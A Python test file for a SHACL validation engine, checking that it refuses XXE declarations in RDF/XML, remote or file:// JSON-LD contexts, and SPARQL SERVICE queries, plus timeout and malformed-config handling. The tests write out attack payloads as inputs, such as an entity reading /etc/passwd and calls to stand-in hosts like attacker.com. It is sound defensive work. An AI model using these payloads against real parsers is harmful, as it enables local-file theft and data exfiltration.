"""Security tests for the SHACL engine.

Each test below maps directly to one or more commitments in
ADR-2026-05-18 "Security" → "V1 hardenings" and the security
acceptance-test list in "Phase 1c — SPARQL ASK assertions".

The structure mirrors the threat model in the ADR:

1. **prevalidate_safety**: pre-parse content scanning. Rejects
   XXE-style XML constructs in RDF/XML and remote ``@context``
   references in JSON-LD before rdflib's parser sees them. The
   primary line of defence against SSRF / local-file exfiltration
   via the parser layer.

2. **run_sparql_ask**: author-defined SPARQL ASK execution with
   AST scrub at run time (belt-and-suspenders re-check), per-query
   timeout enforcement, and result-type safety (the function never
   raises — failures become a ``(None, error)`` tuple).

3. **evaluate_sparql_assertions**: orchestration of multiple ASKs
   per step. Engine-level errors (timeouts, scrub rejections)
   always produce ERROR findings regardless of configured severity;
   only legitimate ``false`` answers honour the author's choice.

These tests intentionally do not require Django models — they
exercise pure engine functions. Tests that need the full validator
pipeline live in :mod:`test_shacl_validator`.
"""

from __future__ import annotations

from rdflib import Graph

from validibot.validations.constants import Severity
from validibot.validations.validators.shacl import engine
from validibot.validations.validators.shacl.engine import SparqlAskAssertion
from validibot.validations.validators.shacl.engine import evaluate_sparql_assertions
from validibot.validations.validators.shacl.engine import parse_sparql_assertions
from validibot.validations.validators.shacl.engine import prevalidate_safety
from validibot.validations.validators.shacl.engine import run_sparql_ask

MALFORMED_ASSERTION_ISSUE_COUNT = 2

# ── prevalidate_safety: XXE refusal ────────────────────────────────
#
# RDF/XML containing DTD or external-entity declarations is refused
# before rdflib's XML parser ever runs. This prevents the classic
# XXE attack where ``<!ENTITY xxe SYSTEM "file:///etc/passwd">``
# would otherwise produce a triple containing the file's contents.


class TestRdfXmlXxeRefusal:
    """RDF/XML with DTD / external entity constructs is rejected pre-parse."""

    def test_doctype_declaration_refused(self):
        """A DOCTYPE declaration is the trigger for entity expansion attacks.

        Even a minimal DOCTYPE without ENTITY is refused — we cannot
        safely distinguish "harmless" from "harmful" DTDs at scan time,
        and rdflib's parser cannot be trusted to ignore them.
        """
        payload = (
            '<?xml version="1.0"?>'
            "<!DOCTYPE foo>"
            '<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"/>'
        )
        err = prevalidate_safety(payload, "xml")
        assert err is not None
        assert "DOCTYPE" in err or "XXE" in err

    def test_entity_declaration_refused(self):
        """An ENTITY declaration is the XXE trigger we are most worried about.

        ``<!ENTITY xxe SYSTEM "file:///etc/passwd">`` would let an
        attacker reference ``&xxe;`` inside the document and have
        the parser inline /etc/passwd's contents into a triple.
        """
        payload = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            "<rdf:RDF/>"
        )
        err = prevalidate_safety(payload, "xml")
        assert err is not None

    def test_system_keyword_alone_refused(self):
        """An external reference via SYSTEM is refused even outside DOCTYPE.

        The SYSTEM keyword is the canonical signal for "fetch this URL"
        in XML — refusing it on sight is safer than trying to parse out
        whether the surrounding context renders it harmless.
        """
        payload = '<rdf:RDF><foo SYSTEM "http://attacker.com/log"/></rdf:RDF>'
        err = prevalidate_safety(payload, "xml")
        assert err is not None

    def test_clean_rdf_xml_passes(self):
        """An RDF/XML payload with no XXE constructs is unaffected.

        Without this passing, every legitimate RDF/XML submission would
        be refused — defeating the format. The scanner must be specific
        enough to reject XXE without false positives on normal content.
        """
        clean = (
            '<?xml version="1.0"?>'
            '<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">'
            "</rdf:RDF>"
        )
        assert prevalidate_safety(clean, "xml") is None

    def test_doctype_in_turtle_literal_passes(self):
        """The XXE check runs only on RDF/XML, not Turtle.

        A Turtle literal containing the string ``<!DOCTYPE`` is harmless
        because rdflib's Turtle parser does not interpret XML. The
        scanner must scope its check to the format that actually has
        an XML parser.
        """
        turtle = '@prefix ex: <http://example.com/> . ex:s ex:p "<!DOCTYPE foo>" .'
        assert prevalidate_safety(turtle, "turtle") is None


# ── prevalidate_safety: JSON-LD remote context refusal ─────────────
#
# A JSON-LD submission whose @context points at an attacker-controlled
# URL would cause rdflib's JSON-LD parser to GET that URL at parse time
# — leaking the fact that the workflow ran, and (worse) letting the
# attacker control the parsed semantics by returning a context document
# of their choosing.


class TestJsonLdRemoteContextRefusal:
    """JSON-LD with remote @context references is rejected pre-parse."""

    def test_http_context_refused(self):
        """The most common attack: a literal http URL in @context.

        rdflib's JSON-LD plugin would fetch this at parse time. The
        scanner must catch it before the parser is invoked.
        """
        payload = '{"@context": "http://attacker.com/log"}'
        err = prevalidate_safety(payload, "json-ld")
        assert err is not None
        assert "remote" in err.lower() or "@context" in err

    def test_https_context_refused(self):
        """HTTPS does not make the SSRF vector safe.

        The attacker's TLS-secured logging endpoint still leaks the
        request. Both schemes are refused for the same reason.
        """
        payload = '{"@context": "https://attacker.com/log"}'
        err = prevalidate_safety(payload, "json-ld")
        assert err is not None

    def test_file_scheme_context_refused(self):
        """A ``file://`` context URL would read local files.

        Same XXE-class attack as RDF/XML, just via the JSON-LD plugin's
        URL-fetching path.
        """
        payload = '{"@context": "file:///etc/passwd"}'
        err = prevalidate_safety(payload, "json-ld")
        assert err is not None

    def test_inline_context_object_passes(self):
        """An inline @context object is the safe pattern; it must pass.

        Without this, every legitimate JSON-LD with a custom vocabulary
        would be refused — defeating the format. The scanner must
        distinguish "URL string" from "object literal".
        """
        payload = '{"@context": {"ex": "http://example.com/"}, "@id": "ex:foo"}'
        assert prevalidate_safety(payload, "json-ld") is None

    def test_data_uri_context_passes(self):
        """A ``data:`` URI carries the context inline as bytes.

        The pattern is sometimes used to embed a context document
        without an external dependency. The scanner explicitly allows
        the ``data:`` scheme since no network fetch is triggered.
        """
        payload = (
            '{"@context": "data:application/json;base64,'
            'eyJleCI6Imh0dHA6Ly9leGFtcGxlLmNvbS8ifQ=="}'
        )
        assert prevalidate_safety(payload, "json-ld") is None

    def test_first_context_in_array_refused(self):
        """JSON-LD allows @context to be an array; first remote URL is refused.

        Attackers may try to hide a remote context behind a leading
        inline entry — but the array form still references the URL
        verbatim in the source. The scanner catches the first http(s)
        URL in any position.
        """
        payload = '{"@context": ["http://attacker.com/", {"ex": "ex:"}]}'
        err = prevalidate_safety(payload, "json-ld")
        assert err is not None

    def test_later_context_in_array_refused(self):
        """Every array item is scanned, not just the first one."""
        payload = '{"@context": [{"ex": "http://example.com/"}, "https://evil.test/"]}'
        err = prevalidate_safety(payload, "json-ld")
        assert err is not None
        assert "@context" in err

    def test_nested_context_refused(self):
        """Nested/property-scoped contexts are also document-load surfaces."""
        payload = (
            '{"@context": {"ex": "http://example.com/"}, '
            '"child": {"@context": "https://evil.test/context.jsonld"}}'
        )
        err = prevalidate_safety(payload, "json-ld")
        assert err is not None

    def test_relative_context_refused(self):
        """Relative context references can still trigger document loading."""
        payload = '{"@context": "./context.jsonld"}'
        err = prevalidate_safety(payload, "json-ld")
        assert err is not None


# ── run_sparql_ask: happy path and basic correctness ──────────────


def _build_person_graph() -> Graph:
    """A two-triple test graph used by the run_sparql_ask cases."""
    g = Graph()
    g.parse(
        data=(
            "@prefix ex: <http://example.com/> .\n"
            'ex:alice a ex:Person ; ex:name "Alice" .\n'
            "ex:bob a ex:Person .\n"
        ),
        format="turtle",
    )
    return g


class TestRunSparqlAskHappyPath:
    """The basic engine surface — a working ASK returns its boolean."""

    def test_true_ask_returns_true(self):
        """A pattern that matches the graph returns ``True``, no error.

        This is the minimal proof that the engine wiring (target-graph
        selection, query execution, result extraction) works.
        """
        g = _build_person_graph()
        answer, err = run_sparql_ask(
            query_text=("PREFIX ex: <http://example.com/> ASK { ?p a ex:Person }"),
            target_graph_name="data",
            data_graph=g,
            results_graph=None,
        )
        assert err is None
        assert answer is True

    def test_false_ask_returns_false(self):
        """A pattern that does not match returns ``False``, no error.

        Critical for the gate semantics: ``answer is False`` is the
        trigger for emitting a finding. Anything else would be a bug.
        """
        g = _build_person_graph()
        answer, err = run_sparql_ask(
            query_text=("PREFIX ex: <http://example.com/> ASK { ?p a ex:Robot }"),
            target_graph_name="data",
            data_graph=g,
            results_graph=None,
        )
        assert err is None
        assert answer is False


# ── run_sparql_ask: defence-in-depth scrub re-check ──────────────
#
# The form layer already rejects forbidden queries at save time.
# But nothing prevents a fixture, an admin import, or a downstream
# API consumer from inserting an unscrubbed query directly into
# Ruleset.metadata. The engine re-scrubs on every execution as a
# belt-and-suspenders measure.


class TestRunSparqlAskBeltAndSuspenders:
    """The engine re-runs the scrubber even if persistence bypassed the form."""

    def test_select_rejected_at_run_time(self):
        """SELECT query rejected by the engine, never reaches rdflib.

        Demonstrates the re-scrub: even if a SELECT somehow landed in
        persistence, the engine refuses to execute it. The error is
        clearly attributed to the scrub so operator forensics is easy.
        """
        g = _build_person_graph()
        answer, err = run_sparql_ask(
            query_text="SELECT * WHERE { ?s ?p ?o }",
            target_graph_name="data",
            data_graph=g,
            results_graph=None,
        )
        assert answer is None
        assert err is not None
        assert "scrub" in err.lower()

    def test_service_rejected_at_run_time(self):
        """SERVICE federation rejected by the engine.

        The most important re-scrub case: SERVICE is the exfiltration
        vector that the form scrub primarily exists to block. The
        engine refuses to execute it independently.
        """
        g = _build_person_graph()
        answer, err = run_sparql_ask(
            query_text=("ASK { SERVICE <http://attacker.com/> { ?s ?p ?o } }"),
            target_graph_name="data",
            data_graph=g,
            results_graph=None,
        )
        assert answer is None
        assert err is not None
        assert "SERVICE" in err or "scrub" in err.lower()


# ── run_sparql_ask: unknown target graph ───────────────────────────


class TestRunSparqlAskTargetGraph:
    """Target-graph resolution must be strict about what it accepts."""

    def test_unknown_target_rejected(self):
        """An invalid ``target_graph_name`` is refused with a clear message.

        Any value outside ``data`` / ``results`` / ``union`` is a config
        bug; the engine refuses to guess at the author's intent.
        """
        g = _build_person_graph()
        answer, err = run_sparql_ask(
            query_text="ASK { ?s ?p ?o }",
            target_graph_name="wat",
            data_graph=g,
            results_graph=None,
        )
        assert answer is None
        assert err is not None
        assert "target" in err.lower()

    def test_results_target_with_no_results_graph(self):
        """Requesting the ``results`` target before SHACL ran is a clear error.

        This happens when an upstream stage (parse, inference, SHACL
        engine) failed and no results graph exists. The author should
        see a configuration message, not a NameError stack trace.
        """
        g = _build_person_graph()
        answer, err = run_sparql_ask(
            query_text="ASK { ?s ?p ?o }",
            target_graph_name="results",
            data_graph=g,
            results_graph=None,
        )
        assert answer is None
        assert err is not None
        assert "results" in err.lower()

    def test_union_target_with_no_results_graph_falls_back_to_data(self):
        """``union`` without results graph treats data as the union.

        The semantics aren't perfectly principled — strictly speaking
        union of (data, ∅) is just data — but it lets author-written
        union queries continue to function when the upstream SHACL
        report happens to be empty, rather than hard-failing the run.
        """
        g = _build_person_graph()
        answer, err = run_sparql_ask(
            query_text=("PREFIX ex: <http://example.com/> ASK { ?p a ex:Person }"),
            target_graph_name="union",
            data_graph=g,
            results_graph=None,
        )
        assert err is None
        assert answer is True


# ── evaluate_sparql_assertions: orchestration ──────────────────────


class TestEvaluateSparqlAssertions:
    """The multi-assertion orchestrator produces one finding per failure."""

    def test_all_true_produces_no_findings(self):
        """Every ASK true → empty issues list.

        The contract for the orchestrator: only failing assertions
        contribute. A workflow with three passing gates produces zero
        findings; the step's ``passed`` flag will be True downstream.
        """
        g = _build_person_graph()
        issues = evaluate_sparql_assertions(
            assertions=[
                SparqlAskAssertion(
                    target_graph="data",
                    query=("PREFIX ex: <http://example.com/> ASK { ?p a ex:Person }"),
                    severity=Severity.ERROR,
                    description="At least one Person",
                ),
            ],
            data_graph=g,
            results_graph=None,
        )
        assert issues == []

    def test_false_answer_emits_finding_at_configured_severity(self):
        """A ``false`` answer emits one finding at the configured severity.

        Verifies that the orchestrator honours the author's chosen
        severity (WARNING here, not ERROR) — important so authors can
        layer advisory checks alongside hard gates without escalating
        everything.
        """
        g = _build_person_graph()
        issues = evaluate_sparql_assertions(
            assertions=[
                SparqlAskAssertion(
                    target_graph="data",
                    query=("PREFIX ex: <http://example.com/> ASK { ?p a ex:Robot }"),
                    severity=Severity.WARNING,
                    description="At least one Robot",
                    error_message_template="No Robot found",
                ),
            ],
            data_graph=g,
            results_graph=None,
        )
        assert len(issues) == 1
        assert issues[0].severity == Severity.WARNING
        assert issues[0].message == "No Robot found"

    def test_engine_error_emits_error_regardless_of_configured_severity(self):
        """Engine-level failures always become ERROR.

        A SPARQL scrub rejection at run time means the configuration
        itself is broken. We escalate to ERROR even if the author had
        marked the assertion as advisory — they need to see the
        config bug, not a soft warning that lets a bad workflow pass.
        """
        g = _build_person_graph()
        issues = evaluate_sparql_assertions(
            assertions=[
                SparqlAskAssertion(
                    target_graph="data",
                    # Smuggle a SELECT through the typed dataclass to
                    # simulate a persistence-layer bypass.
                    query="SELECT * WHERE { ?s ?p ?o }",
                    severity=Severity.WARNING,
                    description="A bad assertion",
                ),
            ],
            data_graph=g,
            results_graph=None,
        )
        assert len(issues) == 1
        assert issues[0].severity == Severity.ERROR
        assert issues[0].code == "shacl.sparql_ask_engine_error"


# ── parse_sparql_assertions: tolerant rehydration ─────────────────


class TestParseSparqlAssertions:
    """Malformed persisted SPARQL assertion payloads are skipped, not raised."""

    def test_well_formed_list_rehydrates(self):
        """A complete dict becomes a SparqlAskAssertion instance.

        This keeps the low-level parser compatible with admin imports
        and older metadata-shaped fixtures while the production path now
        passes ``RulesetAssertion`` rows.
        """
        result = parse_sparql_assertions(
            [
                {
                    "target_graph": "data",
                    "query": "ASK { ?s ?p ?o }",
                    "severity": Severity.ERROR,
                    "description": "Test",
                    "error_message_template": "Failed",
                },
            ],
        )
        assert len(result) == 1
        assert result[0].target_graph == "data"
        assert result[0].severity == Severity.ERROR

    def test_non_list_returns_empty(self):
        """A corrupted blob (not a list) returns ``[]``, not a crash.

        Defensive: an admin import or migration could pass a string or
        a dict instead of the expected list of assertion rows/payloads.
        The engine must degrade gracefully — equivalent to "no
        assertions configured" — rather than crashing every run for
        that org until manual repair.
        """
        assert parse_sparql_assertions("not a list") == []
        assert parse_sparql_assertions({"foo": "bar"}) == []
        assert parse_sparql_assertions(None) == []

    def test_malformed_entries_skipped(self):
        """Bad entries are skipped; good entries in the same list are kept.

        Partial corruption shouldn't take down the whole step. Each
        entry is validated independently; the engine logs a warning
        for the bad ones (forensics) and proceeds with the good ones.
        """
        result = parse_sparql_assertions(
            [
                "not a dict",
                {"target_graph": "invalid", "query": "ASK { ?s ?p ?o }"},
                {"target_graph": "data", "query": ""},  # empty query
                {
                    "target_graph": "data",
                    "query": "ASK { ?s ?p ?o }",
                    "severity": Severity.INFO,
                },
            ],
        )
        assert len(result) == 1
        assert result[0].severity == Severity.INFO

    def test_malformed_entries_can_emit_config_errors(self):
        """Validator orchestration turns stored assertion corruption into findings.

        Direct helper calls stay tolerant for low-level callers, but the
        production validator passes an issue list so bad stored config
        cannot silently remove SPARQL gates.
        """
        issues = []
        result = parse_sparql_assertions(
            [
                {"target_graph": "invalid", "query": "ASK { ?s ?p ?o }"},
                {
                    "target_graph": "data",
                    "query": "ASK { ?s ?p ?o }",
                    "severity": "NOT_A_SEVERITY",
                },
            ],
            error_issues=issues,
        )
        assert result == []
        assert len(issues) == MALFORMED_ASSERTION_ISSUE_COUNT
        assert all(issue.severity == Severity.ERROR for issue in issues)
        assert {issue.code for issue in issues} == {"shacl.sparql_ask_config_error"}


# ── Timeout enforcement ────────────────────────────────────────────


class TestTimeoutEnforcement:
    """The per-query wall-clock budget kicks in for long-running queries.

    We avoid an actual pathological query in tests (it would slow the
    suite). Instead we set the timeout to zero and confirm the subprocess
    wrapper reports the timeout cleanly rather than crashing.
    """

    def test_zero_timeout_produces_timeout_error(self):
        """A 0-second budget always reports a timeout error.

        Edge-case but defensive: even a query that returns instantly
        would not have time to complete with a sub-millisecond budget.
        The subprocess timeout path should return a structured error
        instead of leaking a running query in the Django or Celery worker.
        """
        g = _build_person_graph()
        # We must call the internal function directly to set timeout=0.
        # run_sparql_ask's public API enforces a positive timeout via
        # resolve_sparql_timeout, which is the right default but
        # blocks this regression test.
        answer, err = engine._execute_ask_with_timeout(
            query_text=("PREFIX ex: <http://example.com/> ASK { ?p a ex:Person }"),
            graph=g,
            timeout_seconds=0,
        )
        # Either the query finished in zero time (unlikely but possible)
        # or it timed out. Both outcomes prove no crash.
        if answer is None:
            assert err is not None
            assert "budget" in err.lower() or "timeout" in err.lower()
        else:
            assert answer in (True, False)


# ── Network lockdown smoke test ────────────────────────────────────


class TestNetworkLockdownSmokeTest:
    """End-to-end proof that prevalidate_safety stops the network path.

    These tests do not mock anything — they pass attacker-style content
    through ``parse_rdf`` (which calls ``prevalidate_safety`` first) and
    confirm the function returns an error before rdflib's parsers
    would have made a network call.
    """

    def test_jsonld_remote_context_blocked_before_parse(self):
        """A remote @context never reaches rdflib's parser.

        Hardening test: if this returns a graph instead of an error,
        rdflib was given the bytes — and rdflib's JSON-LD plugin by
        default fetches the remote URL. Failing this is a security
        regression, not a correctness one.
        """
        payload = '{"@context": "http://attacker.invalid/never-fetched"}'
        graph, err = engine.parse_rdf(payload, "json-ld")
        assert graph is None
        assert err is not None
        # We did not actually hit the network — the test relies on
        # "attacker.invalid" being non-routable; any real attempt
        # would fail with a connection error rather than our scan
        # message. The presence of "remote" in the error confirms the
        # scan caught it.
        assert "remote" in err.lower() or "@context" in err

    def test_xxe_payload_blocked_before_parse(self):
        """An XXE-style RDF/XML payload never reaches rdflib's parser."""
        payload = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            "<rdf:RDF/>"
        )
        graph, err = engine.parse_rdf(payload, "xml")
        assert graph is None
        assert err is not None
